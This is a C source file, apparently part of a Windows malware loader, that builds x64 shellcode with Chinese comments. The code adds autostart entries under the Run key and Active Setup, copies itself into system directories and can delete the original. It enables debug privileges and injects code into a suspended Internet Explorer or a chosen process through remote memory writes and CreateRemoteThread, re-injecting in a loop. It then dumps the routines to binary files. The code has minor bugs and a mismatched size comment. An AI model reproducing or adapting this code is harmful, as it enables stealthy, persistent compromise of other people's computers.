#include "shellcodes.h"
#include "global_data.h"

#ifdef _WIN64

#pragma optimize("ts", on)

extern void add_startup_hklm_x64_end();

void add_startup_hklm_x64(x64_global_data_t *x64_global_data, global_data_t *global_data) {
  HKEY root;
  char *subkey = (char *)add_startup_hklm_x64_end;

  if (x64_global_data->xRegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, KEY_WRITE, &root) != 0) return;

  wchar_t temp[100];

  x64_global_data->xRtlZeroMemory(temp, sizeof(temp));
  x64_global_data->xlstrcpyW(temp, global_data->nklm_name);

  x64_global_data->xRegSetValueExW(root, temp, 0, REG_SZ, (const BYTE *)global_data->loader_path, (x64_global_data->xlstrlenW(global_data->loader_path) + 1) * sizeof(wchar_t));
  x64_global_data->xRegCloseKey(root);
}

void add_startup_hklm_x64_end() {
  printf(__FUNCTION__);
}

extern void add_startup_activex_x64_end();

void add_startup_activex_x64(x64_global_data_t *x64_global_data, global_data_t *global_data) {
  HKEY root, stub;
  wchar_t tempkey[10];
  char *subkey = (char *)add_startup_activex_x64_end;

  if (x64_global_data->xRegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, KEY_ALL_ACCESS, &root) != 0) return;

  // 堆栈是对齐的
  tempkey[0] = L'S';
  tempkey[1] = L't';
  tempkey[2] = L'u';
  tempkey[3] = L'b';
  tempkey[4] = L'P';
  tempkey[5] = L'a';
  tempkey[6] = L't';
  tempkey[7] = L'h';
  tempkey[8] = 0;

  if (x64_global_data->xRegCreateKeyExW(root, global_data->activex_name, 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &stub, 0) != 0) {
    x64_global_data->xRegCloseKey(root);
  }

  x64_global_data->xRegSetValueExW(stub, tempkey, 0, REG_SZ, (const BYTE *)global_data->loader_path, (x64_global_data->xlstrlenW(global_data->loader_path) + 1) * 2);

  x64_global_data->xRegCloseKey(stub);
  x64_global_data->xRegCloseKey(root);
}

void add_startup_activex_x64_end() {
  printf(__FUNCTION__);
}

void copy_self_x64(x64_global_data_t *x64_global_data, global_data_t *global_data) {
  wchar_t path[MAX_PATH];

  u32 ret = 0;

  if (global_data->copy_method == COPY_METHOD_TO_WINDOWS) {
    ret = x64_global_data->xGetWindowsDirectoryW(path, MAX_PATH);
  }
  else {
    ret = x64_global_data->xGetSystemDirectoryW(path, MAX_PATH);
  }

  path[ret] = L'\\';
  path[ret + 1] = 0;

  x64_global_data->xlstrcatW(path, global_data->copy_to);
  if (x64_global_data->xlstrcmpiW(global_data->loader_path, path) != 0) {
    if (!x64_global_data->xCopyFileW(global_data->loader_path, path, true)) return;

    if (global_data->melt) {
      x64_global_data->xDeleteFileW(global_data->loader_path);
    }

    x64_global_data->xRtlZeroMemory(global_data->loader_path, sizeof(global_data->loader_path));
    x64_global_data->xlstrcpyW(global_data->loader_path, path);
  }
}

void copy_self_x64_end() {
  printf(__FUNCTION__);
}

u32 find_process_by_name_x64(x64_global_data_t *x64_global_data, wchar_t *name) {
  PROCESSENTRY32W pe32;
  
  pe32.dwSize = sizeof(pe32);
  HANDLE tlhandle = x64_global_data->xCreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
  if (tlhandle == INVALID_HANDLE_VALUE) return 0;

  x64_global_data->xProcess32FirstW(tlhandle, &pe32);
  while (x64_global_data->xProcess32NextW(tlhandle, &pe32)) {
    if (x64_global_data->xlstrcmpiW(pe32.szExeFile, name) == 0) {
      x64_global_data->xCloseHandle(tlhandle);
      return pe32.th32ProcessID;
    }
  }

  x64_global_data->xCloseHandle(tlhandle);
  return 0;
}

void find_process_by_name_x64_end() {
  printf(__FUNCTION__);
}

extern void inject_to_explorer_code_x64_init(global_data_t *global_data, x64_global_data_t *x64_global_data);

void __stdcall inject_to_explorer_code_x64(explorer_thread_param_t *param) {
  global_data_t *global_data = &param->global_data;
  x64_global_data_t x64_global_data;
  
  // inject_to_explorer_code_x64_init
  inject_to_explorer_code_x64_init(global_data, &x64_global_data);

  // 等待几秒钟让loader退出
  x64_global_data.xSleep(1000 * 2);

  HANDLE mutex_handle = x64_global_data.xCreateMutexA(0, false, global_data->mutex_name);
  if (mutex_handle == 0) return;

  if (x64_global_data.xGetLastError() == ERROR_ALREADY_EXISTS) {
    x64_global_data.xCloseHandle(mutex_handle);
    return;
  }

  HANDLE token;
  TOKEN_PRIVILEGES tkp;

  if (!x64_global_data.xOpenProcessToken(x64_global_data.xGetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) return;

  if (!x64_global_data.xLookupPrivilegeValueA(NULL, x64_global_data.sedebugname, &tkp.Privileges[0].Luid)) {
    x64_global_data.xCloseHandle(token);
    return;
  }

  tkp.PrivilegeCount = 1;
  tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  if (!x64_global_data.xAdjustTokenPrivileges(token, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
    x64_global_data.xCloseHandle(token);
    return;
  }

  if (global_data->copy_method != COPY_METHOD_NONE) {
    global_data->copy_self_x64(&x64_global_data, global_data);
  }

  if (global_data->startup_hklm) {
    global_data->add_startup_hklm_x64(&x64_global_data, global_data);
  }

  if (global_data->startup_acitvex) {
    global_data->add_startup_activex_x64(&x64_global_data, global_data);
  }

  // 获取ie路径
  wchar_t ie_path[MAX_PATH];

  u32 ret = x64_global_data.xExpandEnvironmentStringsW(x64_global_data.expand_str, ie_path, MAX_PATH);
  ie_path[ret] = 0;

  HANDLE heap = x64_global_data.xGetProcessHeap();
  global_data_t *new_global_data = (global_data_t *)x64_global_data.xHeapAlloc(heap, HEAP_ZERO_MEMORY, sizeof(global_data_t));

  for (;;) {
    HANDLE process = 0;

    if (global_data->inject_to_custom) {
      for (u32 i = 0; i < INJECT_TIMES; i++) {
        x64_global_data.xSleep(INJECT_INTERVAL);
        u32 pid = global_data->find_process_by_name_x64(&x64_global_data, global_data->custom_process_name);
        if (pid != 0) {
          process = x64_global_data.xOpenProcess(PROCESS_ALL_ACCESS, false, pid);
          if (process != 0) break;
        }
      }
    }

    // 注入到ie
    if (process == 0) {
      STARTUPINFOW si;
      PROCESS_INFORMATION pi;

      x64_global_data.xRtlZeroMemory(&si, sizeof(si));
      x64_global_data.xRtlZeroMemory(&pi, sizeof(pi));

      si.cb = sizeof(si);
      si.wShowWindow = SW_SHOWNORMAL;

      if (!x64_global_data.xCreateProcessW(0, ie_path, 0, 0, false, CREATE_SUSPENDED | DETACHED_PROCESS, 0, 0, &si, &pi)) continue;

      x64_global_data.xCloseHandle(pi.hThread);
      process = pi.hProcess;
    }

    x64_global_data.xRtlZeroMemory(new_global_data, sizeof(global_data_t));
    x64_global_data.xRtlMoveMemory(new_global_data, global_data, sizeof(global_data_t));

    // 修复global_data extrac函数
    extra_function_t *extrac_function = &new_global_data->connect_by_socks5;
    void *temp = 0;

    for (u32 i = 0; i < 15; i++) {
      if (extrac_function->ptr64 != 0) {
        temp = x64_global_data.xVirtualAllocEx(process, 0, extrac_function->size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (temp == 0) break;
        if (!x64_global_data.xWriteProcessMemory(process, temp, (void *)extrac_function->ptr64, extrac_function->size, 0)) break;
        extrac_function->ptr64 = (u64)temp;
      }
    }
    if (temp == 0) continue;

    void *remote_thread, *remote_param;

    remote_thread = x64_global_data.xVirtualAllocEx(process, 0, param->thread_main_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    remote_param = x64_global_data.xVirtualAllocEx(process, 0, sizeof(global_data_t), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (remote_thread == 0 || remote_param == 0) continue;
    if (!x64_global_data.xWriteProcessMemory(process, remote_thread, (void *)param->thread_main, param->thread_main_size, 0)) continue;
    if (!x64_global_data.xWriteProcessMemory(process, remote_param, new_global_data, sizeof(global_data_t), 0)) continue;

    HANDLE thread = x64_global_data.xCreateRemoteThread(process, 0, 0, (LPTHREAD_START_ROUTINE)remote_thread, remote_param, 0, 0);
    if (thread == 0) continue;

    x64_global_data.xCloseHandle(process);

    if (global_data->persistence) {
      x64_global_data.xWaitForSingleObject(thread, INFINITE);
      x64_global_data.xCloseHandle(thread);
    }
    else {
      x64_global_data.xCloseHandle(thread);
      break;
    }
  }

  x64_global_data.xHeapFree(heap, 0, new_global_data);
}

// 这部分用fasm编写
void inject_to_explorer_code_x64_init(global_data_t *global_data, x64_global_data_t *x64_global_data) {
  printf("%S", global_data->activex_name);
  printf("%p", x64_global_data->kernel32);
  printf(__FUNCTION__);
}

void x64_code_save() {
  char *start, *end;
  FILE *f;

  start = (char *)add_startup_hklm_x64;
  end = (char *)add_startup_hklm_x64_end;

  printf("[*] add_startup_hklm_x64 code size = 0x%X\n", end - start);

  f = fopen("add_startup_hklm_x64.bin", "wb");

  u16 temp = offsetof(global_data_t, add_startup_hklm_x64);
  printf("offset: 0x%X\n", temp);

  fwrite(&temp, 1, sizeof(temp), f);

  char *str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

  temp = end - start + lstrlenA(str) + 1;
  fwrite(&temp, 1, sizeof(temp), f);

  fwrite(start, 1, end - start, f);

  fwrite(str, 1, lstrlenA(str) + 1, f);

  fclose(f);

  printf("[*] save add_startup_hklm_x64 to add_startup_hklm_x64.bin success.\n");

  start = (char *)add_startup_activex_x64;
  end = (char *)add_startup_activex_x64_end;

  printf("[*] add_startup_activex_x64 code size = 0x%X\n", end - start);

  f = fopen("add_startup_activex_x64.bin", "wb");

  temp = offsetof(global_data_t, add_startup_activex_x64);
  printf("offset: 0x%X\n", temp);

  fwrite(&temp, 1, sizeof(temp), f);

  str = "SOFTWARE\\Microsoft\\Active Setup\\Installed Components";
  temp = end - start + lstrlenA(str) + 1;
  fwrite(&temp, 1, sizeof(temp), f);

  fwrite(start, 1, end - start, f);

  fwrite(str, 1, lstrlenA(str) + 1, f);

  fclose(f);

  printf("[*] save add_startup_activex_x64 to add_startup_activex_x64.bin success.\n");
  
  start = (char *)copy_self_x64;
  end = (char *)copy_self_x64_end;

  printf("[*] copy_self_x64 code size = 0x%X\n", end - start);

  f = fopen("copy_self_x64.bin", "wb");

  temp = offsetof(global_data_t, copy_self_x64);
  printf("offset: 0x%X\n", temp);

  fwrite(&temp, 1, sizeof(temp), f);

  temp = end - start;
  fwrite(&temp, 1, sizeof(temp), f);

  fwrite(start, 1, end - start, f);

  fclose(f);

  printf("[*] save copy_self_x64 to copy_self_x64.bin success.\n");

  start = (char *)find_process_by_name_x64;
  end = (char *)find_process_by_name_x64_end;

  printf("[*] find_process_by_name_x64 code size = 0x%X\n", end - start);

  f = fopen("find_process_by_name_x64.bin", "wb");

  temp = offsetof(global_data_t, find_process_by_name_x64);
  printf("offset: 0x%X\n", temp);

  fwrite(&temp, 1, sizeof(temp), f);

  temp = end - start;
  fwrite(&temp, 1, sizeof(temp), f);

  fwrite(start, 1, end - start, f);

  fclose(f);

  printf("[*] save find_process_by_name_x64 to find_process_by_name_x64.bin success.\n");

  start = (char *)inject_to_explorer_code_x64;
  end = (char *)inject_to_explorer_code_x64_init;

  printf("[*] inject_to_explorer_code_x64 code size = 0x%X\n", end - start + 594);

  f = fopen("inject_to_explorer_code_x64.bin", "wb");

  temp = offsetof(global_data_t, inject_to_explorer_code_x64);
  printf("offset: 0x%X\n", temp);

  fwrite(&temp, 1, sizeof(temp), f);

  // 628 = init code size
  temp = end - start + 594;
  fwrite(&temp, 1, sizeof(temp), f);

  fwrite(start, 1, end - start, f);

  fclose(f);

  printf("[*] save inject_to_explorer_code_x64 to inject_to_explorer_code_x64.bin success.\n");
}

#pragma optimize("ts", off)

#endif